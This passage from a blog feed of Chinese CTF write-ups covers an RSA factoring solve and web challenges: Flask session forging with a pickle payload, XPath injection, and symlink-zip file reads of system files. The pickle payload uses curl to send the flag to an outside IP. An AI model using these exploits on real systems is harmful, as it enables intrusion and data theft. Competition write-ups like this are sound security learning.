class="line"><span class="string">68124e0002000f0103000506090000330000001c</span></span><br><span class="line"><span class="string">6812500002000f01030005060e0000640000001c</span></span><br><span class="line"><span class="string">680401005200</span></span><br><span class="line"><span class="string">6812520002000f01030005060f0000380000001a</span></span><br><span class="line"><span class="string">6812540002000f01030005060f0000380000001b</span></span><br><span class="line"><span class="string">6812560002000f0103000506140000350000001c</span></span><br><span class="line"><span class="string">6812580002000f01030005060e0000640000001d</span></span><br><span class="line"><span class="string">68125a0002000f0103000506160000330000001b</span></span><br><span class="line"><span class="string">68125c0002000f01030005061900006300000019</span></span><br><span class="line"><span class="string">680401005e00</span></span><br><span class="line"><span class="string">68125e0002000f01030005061c00006400000019</span></span><br><span class="line"><span class="string">6812600002000f01030005062700003500000019</span></span><br><span class="line"><span class="string">6812620002000f0103000506270000350000001a</span></span><br><span class="line"><span class="string">6812640002000f0103000506010000660000001d</span></span><br><span class="line"><span class="string">6812660002000f01030005060200006c0000001b</span></span><br><span class="line"><span class="string">6812680002000f0103000506030000610000001e</span></span><br><span class="line"><span class="string">68126a0002000f0103000506040000670000001d</span></span><br><span class="line"><span class="string">680401006a00</span></span><br><span class="line"><span class="string">68126c0002000f01030005060500007b0000001e</span></span><br><span class="line"><span class="string">68126e0002000f0103000506060000360000001d</span></span><br><span class="line"><span class="string">6812700002000f0103000506070000380000001c</span></span><br><span class="line"><span class="string">6812720002000f0103000506080000620000001d</span></span><br><span class="line"><span class="string">6812740002000f0103000506090000330000001d</span></span><br><span class="line"><span class="string">6812760002000f01030005060a0000340000001d</span></span><br><span class="line"><span class="string">6812780002000f01030005060b0000640000001b</span></span><br><span class="line"><span class="string">68127a0002000f01030005060c0000390000001c</span></span><br><span class="line"><span class="string">680401007a00</span></span><br><span class="line"><span class="string">68127c0002000f01030005060d0000320000001c</span></span><br><span class="line"><span class="string">68127e0002000f01030005060e0000640000001e</span></span><br><span class="line"><span class="string">6812800002000f01030005060f0000380000001c</span></span><br><span class="line"><span class="string">6812820002000f0103000506100000610000009a</span></span><br><span class="line"><span class="string">6812840002000f0103000506110000380000001c</span></span><br><span class="line"><span class="string">6812860002000f0103000506120000340000001b</span></span><br><span class="line"><span class="string">6812880002000f0103000506130000340000001c</span></span><br><span class="line"><span class="string">68128a0002000f0103000506140000350000001d</span></span><br><span class="line"><span class="string">680401008a00</span></span><br><span class="line"><span class="string">68128c0002000f0103000506150000300000001b</span></span><br><span class="line"><span class="string">68128e0002000f0103000506160000330000001c</span></span><br><span class="line"><span class="string">6812900002000f01030005061700003900000018</span></span><br><span class="line"><span class="string">6812920002000f01030005062800007d00000017</span></span><br><span class="line"><span class="string">6812940002000f0103000506190000630000001a</span></span><br><span class="line"><span class="string">6812960002000f01030005061a00006500000019</span></span><br><span class="line"><span class="string">6812980002000f01030005061b00002d00000098</span></span><br><span class="line"><span class="string">68129a0002000f01030005061c0000640000001a</span></span><br><span class="line"><span class="string">680401009a00</span></span><br><span class="line"><span class="string">68129c0002000f01030005061d00003600000018</span></span><br><span class="line"><span class="string">68129e0002000f01030005061e00003800000019</span></span><br><span class="line"><span class="string">6812a00002000f01030005061f00003100000017</span></span><br><span class="line"><span class="string">6812a20002000f01030005062000003900000017</span></span><br><span class="line"><span class="string">6812a40002000f01030005062100006400000016</span></span><br><span class="line"><span class="string">6812a60002000f01030005062200003200000016</span></span><br><span class="line"><span class="string">6812a80002000f01030005062300003300000015</span></span><br><span class="line"><span class="string">6812aa0002000f01030005062400003600000016</span></span><br><span class="line"><span class="string">68040100aa00</span></span><br><span class="line"><span class="string">6812ac0002000f01030005062500003200000016</span></span><br><span class="line"><span class="string">6812ae0002000f01030005062600006400000016</span></span><br><span class="line"><span class="string">6812b00002000f0103000506270000350000001b</span></span><br><span class="line"><span class="string">6812b20002000f01030005061800006400000019</span></span><br><span class="line"><span class="string">6812b40002000f01030005062500003200000017</span></span><br><span class="line"><span class="string">68040100b600</span></span><br><span class="line"><span class="string">6812b60002000f01030005061d00003600000019</span></span><br><span class="line"><span class="string">6812b80002000f0103000506060000360000001e</span></span><br><span class="line"><span class="string">6812ba0002000f0103000506040000670000001e</span></span><br><span class="line"><span class="string">6812bc0002000f0103000506010000660000001e</span></span><br><span class="line"><span class="string">68040100be00</span></span><br><span class="line"><span class="string">6812be0002000f01030005060200006c0000001c</span></span><br><span class="line"><span class="string">6812c00002000f0103000506100000610000009b</span></span><br><span class="line"><span class="string">6812c20002000f01030005062400003600000017</span></span><br><span class="line"><span class="string">68040100c400</span></span><br><span class="line"><span class="string">6812c40002000f0103000506090000330000001e</span></span><br><span class="line"><span class="string">6812c60002000f0103000506100000610000009c</span></span><br><span class="line"><span class="string">6812c80002000f0103000506060000360000001f</span></span><br><span class="line"><span class="string">68040100ca00</span></span><br><span class="line"><span class="string">6812ca0002000f01030005062200003200000017</span></span><br><span class="line"><span class="string">6812cc0002000f01030005062400003600000018</span></span><br><span class="line"><span class="string">6812ce0002000f01030005062600006400000017</span></span><br><span class="line"><span class="string">6812d00002000f01030005062000003900000018</span></span><br><span class="line"><span class="string">68040100d200</span></span><br><span class="line"><span class="string">6812d20002000f01030005060200006c0000001d</span></span><br><span class="line"><span class="string">6812d40002000f01030005060200006c0000001e</span></span><br><span class="line"><span class="string">6812d60002000f01030005060500007b0000001f</span></span><br><span class="line"><span class="string">6812d80002000f01030005060b0000640000001c</span></span><br><span class="line"><span class="string">6812da0002000f0103000506110000380000001d</span></span><br><span class="line"><span class="string">68040100dc00</span></span><br><span class="line"><span class="string">6812dc0002000f01030005062600006400000018</span></span><br><span class="line"><span class="string">6812de0002000f01030005061c0000640000001b</span></span><br><span class="line"><span class="string">6812e00002000f0103000506040000670000001f</span></span><br><span class="line"><span class="string">6812e20002000f0103000506080000620000001e</span></span><br><span class="line"><span class="string">68040100e400</span></span><br><span class="line"><span class="string">6812e40002000f01030005060d0000320000001d</span></span><br><span class="line"><span class="string">6812e60002000f01030005060a0000340000001e</span></span><br><span class="line"><span class="string">6812e80002000f0103000506080000620000001f</span></span><br><span class="line"><span class="string">6812ea0002000f01030005061a0000650000001a</span></span><br><span class="line"><span class="string">68040100ec00</span></span><br><span class="line"><span class="string">6812ec0002000f01030005062000003900000019&quot;&quot;&quot;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data.splitlines():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(i) == <span class="built_in">len</span>(<span class="string">&quot;6812000002000f0103000506010000660000001b&quot;</span>):</span><br><span class="line">        index = <span class="built_in">int</span>(i[-<span class="number">16</span>:-<span class="number">14</span>], <span class="number">16</span>) - <span class="number">1</span></span><br><span class="line">        c = <span class="built_in">chr</span>(<span class="built_in">int</span>(i[-<span class="number">10</span>:-<span class="number">8</span>], <span class="number">16</span>))</span><br><span class="line">        valid = <span class="built_in">bin</span>(<span class="built_in">int</span>(i[-<span class="number">2</span>:], <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> valid.zfill(<span class="number">8</span>)[<span class="number">0</span>] == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">            dic[index] = c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="built_in">print</span>(dic[i], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;68b34d92d88445039dced6819d2362d5&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="crypto">Crypto</h1>
<h2 id="gcd">gcd</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q*p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">x = inverse(n,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n,x,c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 1715097516831775561161353747739509313962850384763754284193603064705990003183954750857689649540587082555847904377918426763475079170697690469267290454724999354302036981034615698694153403754870938739225201770934147845874793740053505575413463153429315475539039712818850905666950096326806695688446947957198050957270336443016980023115464136303403780696015358461369838964806435293267645492940773964907954737849962270208167145137818071024789445448292917016422004351584109968952746852305729861258178402122017513103311904147173869605944992973485253275501741635308107788593258463591060922145241960065862813218690280146883588390356662245698217956617720339878472430817614915509896516775918109916920083183701011823993137753987826242193055167215287839864164955881557719443664876504155709359476375455266912247205663953373944852046907623883953483708248467223346798885142046228485310724692353541792975390854356153906879056788972704718688261213</span></span><br><span class="line"><span class="string">x = 13693034247131001247611357013365838905472128629161269384100755984286945944986882779020879733934334461215591081830359749241927901759168319107452036275703768755532293338513836146556306490425526394420440685291299327486258632666082657664827474947846307949205548526817689180357262646108048851554962291154624349603853599623877095789135051759890435127891210971940795915429197420232561510826760487552089621705187244655827668509013761027910519038664267576214742561936826964572261315984043602119812357324667105678247267841445497640859880436819217418374184256023378843611198818733281625017307272013394628328908242726204785568269</span></span><br><span class="line"><span class="string">c = 1207106262178445359018459948589897274651891185968586806427714234447059397099330669443037189913958678506147447588787686432870791586266645067569198511010947847769438531195366288233395081813524859121328300315116211130908169351354477893647936383056584771268247471788727296968981371535384241445434057942795625350351461517179136190258136244456887118978348223420158887403238429201791427682781494296473806409015961385580794909106746874670027369932286414096790928966277930586468864071103687837936910843559150279603968747213779555572156135983177121194768041838538456267670795923361920648635769732101772513407467158904982779342496410211785417729464008786654808126619152228029357660596380038858050797654917902576424059433048290426186067840363899227577713800670585547473870112798624948349947633855963137174688403113603549470708467306886181387445601800049442519922530086418265660642841544022198981442640591637598035257382429976435264690303</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>已知<strong>ed</strong>，要分解<strong>n</strong>，随便搜到个<a
href="https://aidaip.github.io/crypto/2019/08/21/RSA-%E5%B7%B2%E7%9F%A5ed%E5%88%86%E8%A7%A3n.html">文章</a>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">1715097516831775561161353747739509313962850384763754284193603064705990003183954750857689649540587082555847904377918426763475079170697690469267290454724999354302036981034615698694153403754870938739225201770934147845874793740053505575413463153429315475539039712818850905666950096326806695688446947957198050957270336443016980023115464136303403780696015358461369838964806435293267645492940773964907954737849962270208167145137818071024789445448292917016422004351584109968952746852305729861258178402122017513103311904147173869605944992973485253275501741635308107788593258463591060922145241960065862813218690280146883588390356662245698217956617720339878472430817614915509896516775918109916920083183701011823993137753987826242193055167215287839864164955881557719443664876504155709359476375455266912247205663953373944852046907623883953483708248467223346798885142046228485310724692353541792975390854356153906879056788972704718688261213</span></span><br><span class="line">x = <span class="number">13693034247131001247611357013365838905472128629161269384100755984286945944986882779020879733934334461215591081830359749241927901759168319107452036275703768755532293338513836146556306490425526394420440685291299327486258632666082657664827474947846307949205548526817689180357262646108048851554962291154624349603853599623877095789135051759890435127891210971940795915429197420232561510826760487552089621705187244655827668509013761027910519038664267576214742561936826964572261315984043602119812357324667105678247267841445497640859880436819217418374184256023378843611198818733281625017307272013394628328908242726204785568269</span></span><br><span class="line">c = <span class="number">1207106262178445359018459948589897274651891185968586806427714234447059397099330669443037189913958678506147447588787686432870791586266645067569198511010947847769438531195366288233395081813524859121328300315116211130908169351354477893647936383056584771268247471788727296968981371535384241445434057942795625350351461517179136190258136244456887118978348223420158887403238429201791427682781494296473806409015961385580794909106746874670027369932286414096790928966277930586468864071103687837936910843559150279603968747213779555572156135983177121194768041838538456267670795923361920648635769732101772513407467158904982779342496410211785417729464008786654808126619152228029357660596380038858050797654917902576424059433048290426186067840363899227577713800670585547473870112798624948349947633855963137174688403113603549470708467306886181387445601800049442519922530086418265660642841544022198981442640591637598035257382429976435264690303</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">z = x * n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, z, n</span>):</span><br><span class="line">    k = z * n</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x - <span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x - <span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> p, n // p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pp, q = divide_pq(e, z, n)</span><br><span class="line"><span class="keyword">assert</span> q * pp == n</span><br><span class="line">p = gmpy2.iroot(pp, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * p * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>
<h1 id="refer">Refer</h1>
<p><a
href="https://aidaip.github.io/crypto/2019/08/21/RSA-%E5%B7%B2%E7%9F%A5ed%E5%88%86%E8%A7%A3n.html"><strong>RSA</strong>-已知
<strong>ed</strong> 分解 <strong>n</strong></a></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 美团CTF 线上预选赛 部分题解</title>
    <url>/2022-MTCTF-Preliminary/</url>
    <content><![CDATA[<p>简单记录。</p>
<span id="more"></span>
<h1 id="web">Web</h1>
<h2 id="easypickle">easypickle</h2>
<p>爆破计算<strong>key</strong>，利用<strong>replace</strong>绕过<strong>bior</strong>的<strong>check</strong>，然后<strong>curl</strong>带<strong>post</strong>拿<strong>flag</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>:  <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>:  <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>:  <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(metaclass=ABCMeta):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> (secret_key == <span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> (secret_key == <span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">sec = <span class="string">&quot;045c&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65535</span>):</span><br><span class="line">    token = <span class="string">&quot;eyJ1c2VyIjoibmRhbm4ifQ.YyVYGw.1ShJp1Yz0md7_igsQhkDq_rQT6k&quot;</span></span><br><span class="line">    tmp = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># tmp = os.urandom(2).hex()</span></span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    res = FSCM.decode(token, tmp)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Decoding error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        sec = tmp</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;(cos\nsystem\nVcurl -d &quot;a=`cat flag`&quot; http://106.12.140.75:8000/\nos.&quot;&quot;&quot;</span></span><br><span class="line">session = (FSCM.encode(sec, <span class="string">&#x27;&#123;&quot;user&quot;:&quot;admin&quot;, &quot;ser_data&quot;:&quot;%s&quot;&#125;&#x27;</span> % base64.b64encode(payload).decode()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://eci-2ze1m6bqazd6pfree9xe.cloudeci1.ichunqiu.com:8888/admin&quot;</span></span><br><span class="line">burp0_cookies = &#123;</span><br><span class="line">    <span class="string">&quot;session&quot;</span>: session&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<h2 id="babyjava">babyjava</h2>
<p><strong>xpath</strong>注入，没什么过滤，随便找个工具<strong>xcat</strong>一键出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xcat run -m POST http://eci-2ze39yqy7j0c1bj6kkug.cloudeci1.ichunqiu.com:8888/hello --true-string <span class="string">&quot;&lt;p&gt;user1&quot;</span> xpath <span class="string">&quot;xpath=user1&quot;</span> --encode=form</span><br><span class="line">&lt;root&gt;</span><br><span class="line">        &lt;user&gt;</span><br><span class="line">                &lt;username name=<span class="string">&quot;user1&quot;</span>&gt;</span><br><span class="line">                        user1</span><br><span class="line">                &lt;/username&gt;</span><br><span class="line">                &lt;username name=<span class="string">&quot;user2&quot;</span>&gt;</span><br><span class="line">                        flag?891316ee-6fe3-45c3-b8ac-b1f8f91dbae2?</span><br><span class="line">                &lt;/username&gt;</span><br><span class="line">        &lt;/user&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<h2 id="onlineunzip">OnlineUnzip</h2>
<p>有个<strong>console</strong>，算<strong>pin
debug</strong>命令执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">l = <span class="string">&quot;&quot;&quot;/sys/class/net/eth0/address</span></span><br><span class="line"><span class="string">/etc/machine-id</span></span><br><span class="line"><span class="string">/proc/sys/kernel/random/boot_id</span></span><br><span class="line"><span class="string">/proc/self/cgroup</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> l.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line"><span class="comment"># exit(0)</span></span><br><span class="line"><span class="comment"># a = &quot;&quot;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># a = &quot;/sys/class/net/eth0/address&quot;</span></span><br><span class="line"><span class="comment"># a = &quot;/proc/self/cgroup&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a.splitlines():</span><br><span class="line">        os.popen(<span class="string">&quot;ln -s %s link &amp;&amp; zip --symlinks test.zip link&quot;</span> % i).read()</span><br><span class="line">        r = os.popen(</span><br><span class="line">            <span class="string">&quot;curl -X POST http://eci-2ze0evt5ezb27153ica4.cloudeci1.ichunqiu.com:8888/upload -F file=&#x27;@test.zip&#x27;&quot;</span>).read()</span><br><span class="line">        <span class="comment"># print(&quot;http://eci-2zeii0wm9qa5d519fvkn.cloudeci1.ichunqiu.com:8888/&quot; + r.split(&quot;\&quot;&gt;&quot;)[1].split(&quot;&lt;/a&gt;&quot;)[0])</span></span><br><span class="line"></span><br><span class="line">        os.popen(<span class="string">&quot;rm -rf link test.zip&quot;</span>).read()</span><br><span class="line">        r = requests.get(</span><br><span class="line">            <span class="string">&quot;http://eci-2ze0evt5ezb27153ica4.cloudeci1.ichunqiu.com:8888/&quot;</span> + r.split(<span class="string">&quot;\&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/a&gt;&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;/link&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>然后算一下。</p>
